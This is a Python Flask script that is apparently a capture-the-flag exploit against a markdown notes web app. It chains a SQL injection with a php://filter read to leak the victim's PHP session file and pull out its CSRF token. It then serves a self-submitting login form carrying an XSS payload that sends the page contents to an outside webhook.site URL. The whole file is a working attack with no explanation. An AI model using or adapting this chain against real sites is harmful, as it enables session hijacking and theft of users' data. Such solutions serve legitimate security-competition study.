from flask import Flask, request, render_template_string
import requests
import secrets
import re, base64

app = Flask(__name__)

sess = requests.Session()
BASE = 'http://app.md-notes.space'
def login(username, password):
    csrf_token = sess.get(BASE).text.split('csrf_token" value="')[1].split('"')[0]
    print(f"{username=} {password=} {csrf_token=}")
    data = {
        'username': username,
        'password': password,
        'csrf_token': csrf_token
    }
    return sess.post(BASE + '/login.php', data=data).text

def create(content):
    csrf_token = sess.get(BASE).text.split('csrf_token" value="')[1].split('"')[0]
    data = {
        'content': content,
        'csrf_token': csrf_token
    }
    return sess.post(BASE + '/create.php', data=data).text

login(secrets.token_hex(8), secrets.token_hex(8))


@app.route('/', methods=['GET'])
@app.route('/<PHPSESSID>', methods=['GET'])
def index(PHPSESSID='splitlineXXX'):
    CHAIN = open('chain.txt').read()
    create(f"# xx', '{CHAIN}php://filter/convert.base64-encode/resource=/tmp/sess_{PHPSESSID}'); -- ")
    html = sess.get(BASE).text
    noteid = html.split('href="/view.php?id=', 1)[1].split('"', 1)[0]
    b64leak = sess.get(BASE + '/view.php?id=' + noteid).text.split('render("', 1)[1].split('"', 1)[0]
    sess_leak = base64.b64decode("XXX"+b64leak+"==")
    csrf_token = sess_leak.split(b's:32:"')[1].split(b'";')[0].decode()
    print(f"{csrf_token=}")

    payload = '''
    <script>fetch('/').then(r=>r.text()).then(r=>location='https://webhook.site/39510508-5a83-4a83-b831-30c5fd3896f4?'+encodeURIComponent(r))</script>
    '''.strip()
    return f'''
<form action="http://app.md-notes.space/login.php" method="post" id="form">
    <input type="text" name="username" value="{payload}">
    <input type="password" name="password" value="zzz">
    <input name="csrf_token" value="{csrf_token}">
    <input type="submit" value="Login">
</form>
<script>document.getElementById('form').submit()</script>
'''

app.run(host='0.0.0.0')
